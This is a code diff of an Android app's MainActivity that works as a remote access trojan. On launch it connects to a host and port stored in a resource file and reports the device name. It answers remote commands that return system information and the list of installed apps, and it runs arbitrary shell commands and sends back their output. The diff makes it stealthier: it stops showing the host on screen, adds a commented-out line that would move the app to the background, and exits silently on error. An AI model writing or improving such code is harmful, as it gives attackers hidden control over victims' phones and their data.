@@ -1,6 +1,5 @@
 package com.example.application;
 
-import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -9,7 +8,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
-import java.util.ArrayList;
+
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.Callable;
@@ -20,6 +19,7 @@ import java.util.concurrent.Future;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.ActivityManager;
+import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -41,101 +41,106 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        //moveTaskToBack(true);
+
         try {
-            InputStream inputStream = getResources().openRawResource(R.raw.connect);
-            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-            String host = bufferedReader.readLine();
-            int port = Integer.parseInt(bufferedReader.readLine());
+        InputStream inputStream = getResources().openRawResource(R.raw.connect);
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+        String host = bufferedReader.readLine();
+        int port = Integer.parseInt(bufferedReader.readLine());
 
-            TextView textView = (TextView) findViewById(R.id.textview);
-            textView.setText(host + " " + port);
 
-            Thread socketThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        Socket socket = new Socket(host, port);
-                        OutputStream outputStream = socket.getOutputStream();
-                        InputStream SocketInputStream = socket.getInputStream();
-                        PrintWriter printWriter = new PrintWriter(outputStream);
+        Thread socketThread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Socket socket = new Socket(host, port);
+                    OutputStream outputStream = socket.getOutputStream();
+                    InputStream SocketInputStream = socket.getInputStream();
+                    PrintWriter printWriter = new PrintWriter(outputStream);
 
-                        BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));
+                    BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));
 
-                        printWriter.println(" [ Connect ] " + Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
-                        printWriter.flush();
+                    printWriter.println(" [ Connect ] " + Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
+                    printWriter.flush();
 
-                        while (true)
-                        {
-                            String message = buf.readLine();
-                            if (message == null) {
-                                break;
-                            }
-                            if (message.equals("getinfo")) {
-                                printWriter.println(getSysInfo());
-                                printWriter.flush();
-                            }
-                            if (message.equals("applist")) {
-                                printWriter.println(getAppList());
-                                printWriter.flush();
-                            }
-                            if (message.startsWith("shell ")) {
-                                try{
-                                    String shell = message.substring(6);
-                                    Runtime runtime = Runtime.getRuntime();
+                    while (true)
+                    {
+                        String message = buf.readLine();
+                        if (message == null) {
+                            break;
+                        }
+                        if (message.equals("getinfo")) {
+                            printWriter.println(getSysInfo());
+                            printWriter.flush();
+                            continue;
+                        }
+                        if (message.equals("applist")) {
+                            printWriter.println(getAppList());
+                            printWriter.flush();
+                            continue;
+                        }
+                        if (message.startsWith("shell ")) {
+                            try{
+                                String shell = message.substring(6);
+                                Runtime runtime = Runtime.getRuntime();
 
-                                    Future<Integer> future = executorService.submit(new Callable<Integer>() {
-                                        @Override
-                                        public Integer call() {
-                                            try {
-                                                String[] sendCommand = {
-                                                        "/system/bin/sh","-c",
-                                                        shell
-                                                };
-                                                Process p = Runtime.getRuntime().exec(sendCommand);
-                                                String data = null;
-                                                BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-                                                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                                                String error = null;
-                                                while ((error = ie.readLine()) != null
-                                                        && !error.equals("null")) {
-                                                    data += error + "\n";
-                                                }
-                                                String line = null;
-                                                while ((line = in.readLine()) != null
-                                                        && !line.equals("null")) {
-                                                    data += line + "\n";
-                                                }
-                                                printWriter.println(data.substring(4));
-                                                printWriter.flush();
-                                            }catch (Exception exception) {
-                                                printWriter.println(" [ERROR] COMMAND ERROR !");
-                                                printWriter.flush();
+                                Future<Integer> future = executorService.submit(new Callable<Integer>() {
+                                    @Override
+                                    public Integer call() {
+                                        try {
+                                            String[] sendCommand = {
+                                                    "/system/bin/sh","-c",
+                                                    shell
+                                            };
+                                            Process p = Runtime.getRuntime().exec(sendCommand);
+                                            String data = null;
+                                            BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+                                            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                                            String error = null;
+                                            while ((error = ie.readLine()) != null
+                                                    && !error.equals("null")) {
+                                                data += error + "\n";
                                             }
-                                            return 0;
+                                            String line = null;
+                                            while ((line = in.readLine()) != null
+                                                    && !line.equals("null")) {
+                                                data += line + "\n";
+                                            }
+                                            printWriter.println(data.substring(4));
+                                            printWriter.flush();
+                                        }catch (Exception exception) {
+                                            printWriter.println(" [ERROR] COMMAND ERROR !");
+                                            printWriter.flush();
                                         }
-                                    });
-                                }catch (Exception exception){
-                                    printWriter.println("Command Error or Runtime Error!");
-                                    printWriter.flush();
-                                    continue;
-                                }
+                                        return 0;
+                                    }
+                                });
+                            }catch (Exception exception){
+                                printWriter.println("Command Error or Runtime Error!");
+                                printWriter.flush();
+                                continue;
                             }
                         }
-                        socket.close();
-                    }catch (Exception exception){
-                        exception.printStackTrace();
-                        TextView textView = (TextView) findViewById(R.id.textview);
-                        textView.setText("ERROR: "+exception.getMessage());
+                        else {
+                            printWriter.println(" [ERROR] SEND COMMAND ERROR!");
+                            printWriter.flush();
+                            continue;
+                        }
                     }
+                    socket.close();
+                }catch (Exception exception){
+                    exception.printStackTrace();
+                    System.exit(0);
                 }
-            });
-            socketThread.start();
-        }
-        catch (Exception exception) {
-            exception.printStackTrace();
-            TextView textView = (TextView) findViewById(R.id.textview);
-            textView.setText("ERROR: "+exception.getMessage());
-        }
+            }
+        });
+        socketThread.start();
+    }
+    catch (Exception exception) {
+        exception.printStackTrace();
+        System.exit(0);
+    }
     }
     public String getSysInfo() {
         String phoneName = " Phone Name: "+ Settings.Secure.getString(getContentResolver(),"bluetooth_name");
